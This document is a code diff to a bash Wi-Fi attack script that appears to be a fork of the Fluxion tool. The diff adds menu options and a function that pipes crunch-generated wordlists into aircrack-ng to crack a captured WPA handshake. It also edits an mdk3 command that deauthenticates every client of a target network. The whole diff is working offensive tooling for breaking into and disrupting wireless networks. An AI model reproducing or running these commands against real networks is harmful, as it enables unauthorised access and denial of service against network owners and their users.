@@ -1324,16 +1324,73 @@ function webinterface {
                         echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_webinterface"
                         echo
                         echo -e "      "$red"["$yellow"1"$red"]"$grey" Web Interface"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" \e[1;31mExit"$transparent""
+                        echo -e "      "$red"["$yellow"2"$red"]"$grey" Bruteforce"
+                        echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mExit"$transparent""
                         echo
                         echo -n "#? "
                         read yn
                         case $yn in
                         1 ) matartodo; ConnectionRESET; selection; break;;
-                        2 ) matartodo; exitmode; break;;
+                        2 ) matartodo; bruteforce2; break;;
+                        3 ) matartodo; exitmode; break;;
                         esac
                 done
         fi
+}
+
+
+function bruteforce2() {
+  conditional_clear
+  top
+                        echo ""
+                        echo ""
+                        echo ""
+                        echo -e " ${green} 1) Dictionary"
+                        echo -e ""
+                        echo -e " ${green} 2) Crunch"
+                        echo ""
+                        echo -e " ${green} 3) Back"
+                        echo ""
+                        echo ""
+                        echo -e " ${blue}    princeofguilty@${red}fluxion--#> "
+
+                        read coco
+                        case $coco in
+                          1 ) matartodo; Bruteforce; break;;
+                          2 ) matartodo; dictocrunch; break;;
+                          3 ) webinterface; break;;
+                        esac
+}
+function dictocrunch() {
+
+                      echo -e "   so enter min word's lenght .. "
+                      echo ""
+                      echo -e -n " "$blue"    princeofguilty@"$red"fluxion--#> "
+                      read minc
+                      echo ""
+                      echo -e "   enter max word's lenght .. "
+                      echo ""
+                      echo -e -n " "$blue"    princeofguilty@"$red"fluxion--#> "
+                      read maxc
+
+                      conditional_clear
+
+                      echo -e "   enter charachter set (ex. abc123 and so on) "
+                      echo -e ""
+                      echo -e -n " "$blue"    princeofguilty@"$red"fluxion--#> "
+                      read charset
+                      echo ""
+                      echo "   enter wordlist's pattern .. "
+                      echo ""
+                      echo -e -n " "$blue"    princeofguilty@"$red"fluxion--#> "
+                      read charptn
+                      echo ""
+                      echo ""
+                    if [ "$charptn" = "" ]; then
+                        xterm -hold -e "crunch $minc $maxc $charset | aircrack-ng -b $Host_MAC -w - $DUMP_PATH/$Host_MAC-01.cap " & conditional_clear & top
+                      else
+                      xterm -hold -e "crunch $minc $maxc $charset -t $charptn | aircrack-ng -b $Host_MAC -w - $DUMP_PATH/$Host_MAC-01.cap " & conditional_clear & top
+                    fi
 }
 
 function ConnectionRESET {
@@ -2098,7 +2155,7 @@ function attack {
         killall aireplay-ng &> $flux_output_device
         killall mdk3 &> $flux_output_device
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e "mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN" &
 
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
         conditional_clear
@@ -2110,14 +2167,16 @@ function attack {
                 echo "                                       "
                 echo "      1) Choose another network"
                 echo "      2) Dictionary Bruteforce *wont stop current attack*"
-                echo "      3) Exit"
+                echo "      3) Crunch Bruteforce"
+                echo "      4) Exit"
                 echo " "
                 echo -n '      #> '
                 read yn
                 case $yn in
                         1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
                         2 ) Bruteforce;;
-                        3 ) matartodo; exitmode; break;;
+                        3 ) dictocrunch;;
+                        4 ) matartodo; exitmode; break;;
                         * ) echo "
 $general_case_error"; conditional_clear ;;
                 esac
@@ -2129,7 +2188,7 @@ function Bruteforce {
 
     echo "where is your Dictionary: _"
     read Dictionary0
-    xterm -title "aircrack-ng $Host_MAC --by Princeofguilty" -e  "aircrack-ng $DUMP_PATH/$Host_MAC-01.cap -w $Dictionary0"
+    xterm -hold -title "aircrack-ng $Host_MAC --by Princeofguilty" -e  "aircrack-ng $DUMP_PATH/$Host_MAC-01.cap -w $Dictionary0"
 
 }
 
